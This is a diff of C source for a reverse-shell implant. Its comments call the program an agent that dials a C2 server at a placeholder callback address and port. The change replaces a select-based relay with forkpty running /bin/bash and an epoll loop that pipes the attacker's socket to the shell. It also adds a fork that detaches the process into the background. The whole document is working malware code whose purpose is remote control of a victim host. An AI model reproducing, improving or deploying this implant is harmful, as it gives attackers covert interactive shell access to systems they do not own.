@@ -1,5 +1,6 @@
 #include <arpa/inet.h>
 #include <netdb.h>
+#include <pty.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
@@ -7,11 +8,16 @@
 #include <sys/socket.h>
 #include <sys/select.h>
 #include <unistd.h>
+#include <termios.h>
+#include <sys/epoll.h>
+#include <sys/wait.h>
 
+#define INFINITE_TIMEOUT -1
 #define CALLBACK_IP "127.1" //Change this
 #define CALLBACK_PORT 4444 //Change this
 #define BUFFER_SIZE 1024
 #define CHILD 0
+
 
 /*
 * Function: max
@@ -43,32 +49,38 @@ int max(int val_one, int val_two)
 int shell_setup()
 {
     pid_t pid = -1;
-    int sp[2] = {0, 0};
+    //int sp[2] = {0, 0};
+    int master = -1;
 
-    if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
+    /*if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
     {
         perror("failed to create interpreter socket pair");
-    }
+    }*/
 
-    if ((pid = fork()) < 0)
+    if ((pid = forkpty(&master, NULL, NULL, NULL)) < 0)
     {
         perror("fork");
     }
 
     if (pid == CHILD)
     {
-        close(sp[1]);
+        //close(sp[1]);
+        //dup2(sp[0], STDIN_FILENO);
+        //dup2(sp[0], STDOUT_FILENO);
+        //dup2(sp[0], STDERR_FILENO);
 
-        dup2(sp[0], STDIN_FILENO);
-        dup2(sp[0], STDOUT_FILENO);
-        dup2(sp[0], STDERR_FILENO);
-
-        system("/bin/sh");
+        system("/bin/bash");
     }
 
-    close(sp[0]);
+    /*if (dup2(master, sp[1]) < 0 )
+    {
+        perror("dup2");
+    }*/
 
-    return sp[1];
+    //close(sp[0]);
+
+    //return sp[1];
+    return master;
 }
 
 
@@ -102,94 +114,58 @@ bool exec_command(const char *command, char *result)
     }
 }
 
-/*
-* Function: interpreter
-* ---------------------
-* Main communication loop handling comms between operator
-* and agent. Operator may change at any time, and connection
-* will be maintained by c2
-* Select is used to ensure that if data arrives at any time
-* from either end of the connection, it is processed appropriately
-* Buffer contents used to determine if data should be written to one
-* of the provided pipes
-*
-* ops_pipe: connection to operator (c2)
-* shell_pipe: connection to shell process 
-*/
-void interpreter(int ops_pipe, int shell_pipe)
+
+int comm_c2(int sockfd, int master)
 {
-    struct sockaddr_in client_addr;
-    socklen_t cli_len;
-    char ops_buf[BUFFER_SIZE];
-    char shell_buf[BUFFER_SIZE];
-    int recvlen = 0;
-    ssize_t read_len = 0;
-    fd_set read_set, write_set;
-    int maxfd = max(ops_pipe, shell_pipe);
-
-    memset(ops_buf, 0, BUFFER_SIZE);
-    memset(shell_buf, 0, BUFFER_SIZE);
-    FD_ZERO(&read_set);
-    FD_ZERO(&write_set);
-
-    for (;;)
-    {
-
-        FD_SET(ops_pipe, &read_set);
-        FD_SET(shell_pipe, &read_set);
-
-        //Check if there is data to be written to socks
-        //If there is data to be written, have select()
-        //check if associated pipe is ready for it.
-        if (strlen(ops_buf) > 0)
-        {
-            FD_SET(ops_pipe, &write_set);
-        }
-        if (strlen(shell_buf) > 0)
-        {
-            if (exec_command(shell_buf, ops_buf)) //known command succeeded
-            {
-                puts("match");
-                memset(shell_buf, 0, BUFFER_SIZE);
-                FD_SET(ops_pipe, &write_set);
-            }
-            else //unknown command, pass to shell for execution
-            {
-                puts("***unknown");
-                FD_SET(shell_pipe, &write_set);
-            }
-        }
-
-        if (select(maxfd+1, &read_set, &write_set, NULL, NULL) < 0)
-        {
-            perror("select");
-            exit(EXIT_FAILURE);
-        }
-
-        if(FD_ISSET(ops_pipe, &write_set)) //socket ready to be written
-        {
-            write(ops_pipe, ops_buf, strlen(ops_buf));
-            memset(ops_buf, 0, BUFFER_SIZE);        
-            FD_CLR(ops_pipe, &write_set);
-        }
-        if(FD_ISSET(shell_pipe, &write_set))
-        {
-            write(shell_pipe, shell_buf, strlen(shell_buf));
-            memset(shell_buf, 0, BUFFER_SIZE);
-            FD_CLR(shell_pipe, &write_set);
-        }
-
-        if(FD_ISSET(ops_pipe, &read_set)) //socket ready to be read
-        {
-            read(ops_pipe, shell_buf, BUFFER_SIZE);
-        }
-        if(FD_ISSET(shell_pipe, &read_set))
-        {
-            read(shell_pipe, ops_buf, BUFFER_SIZE);
-        }
-
-    }
+    const int max_events = 5;
+    int epfd, nfds, nb;
+    struct epoll_event ev[2], events[5];
+    unsigned char buf[BUFFER_SIZE];
     
+    epfd = epoll_create(2);
+    ev[0].data.fd = sockfd;
+    ev[0].events = EPOLLIN | EPOLLET;
+    epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &ev[0]);
+    
+    ev[1].data.fd = master;
+    ev[1].events = EPOLLIN | EPOLLET;
+    epoll_ctl(epfd, EPOLL_CTL_ADD, master, &ev[1]);
+    
+    for(;;)
+    {
+        nfds = epoll_wait(epfd, events, max_events, INFINITE_TIMEOUT);
+        for(int i = 0;i < nfds; i ++)
+        {
+            if(events[i].data.fd == sockfd)
+            {
+                nb = read(sockfd, buf, BUFFER_SIZE);
+                if(!nb)
+                    goto __LABEL_EXIT;
+                write(master, buf, nb);
+            }
+            if(events[i].data.fd == master)
+            {
+                nb = read(master, buf, BUFFER_SIZE);
+                if(!nb)
+                    goto __LABEL_EXIT;
+                write(sockfd, buf, nb);                                                              
+            }
+        }
+    }
+    __LABEL_EXIT:
+        close(sockfd);
+        close(master);
+        close(epfd);
+    
+    return 0;
+ 
+}
+
+void sig_child(int signo)
+{
+    int status;
+    pid_t pid = wait(&status);
+    exit(0);
 }
 
 int main()
@@ -197,6 +173,12 @@ int main()
     struct sockaddr_in c2addr;
     int c2_fd = 0;
     int shell_pipe = 0;
+
+    int pid = fork();
+    if (pid < 0)
+        perror("fork");
+    else if (pid > 0)
+        return 0;
 
     if ((c2_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
@@ -216,11 +198,14 @@ int main()
         exit(2);
     }
 
+    signal(SIGCHLD, sig_child);
+
     shell_pipe = shell_setup();
 
-    interpreter(c2_fd, shell_pipe);
+    for(int i = 0; i < 3; i++)
+        dup2(c2_fd, i);
 
-    close(c2_fd);
+    comm_c2(c2_fd, shell_pipe);
 
     return 0;
 }
